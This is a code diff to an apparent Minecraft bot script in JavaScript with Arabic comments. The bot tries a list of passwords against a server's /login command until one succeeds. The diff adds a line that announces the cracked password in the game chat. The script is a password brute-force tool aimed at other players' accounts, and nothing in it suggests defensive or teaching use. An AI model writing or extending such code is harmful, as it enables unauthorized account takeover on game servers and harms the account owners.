@@ -25,9 +25,13 @@ function tryLogin() {
     bot.chat(`/login ${passwords[attempt]}`);
   });
 
-  bot.on('chat', (username, message) => {
+  bot.on('chat', (usernameSender, message) => {
     if (message.includes('تم تسجيل الدخول بنجاح') || message.includes('Login successful')) {
       console.log('✅ تم العثور على كلمة السر:', passwords[attempt]);
+
+      // 🟢 إرسال كلمة السر في شات اللعبة
+      bot.chat(`تم العثور على كلمة السر: ${passwords[attempt]}`);
+
       bot.quit();
     } else if (message.includes('كلمة المرور خاطئة') || message.includes('Incorrect password')) {
       bot.quit();
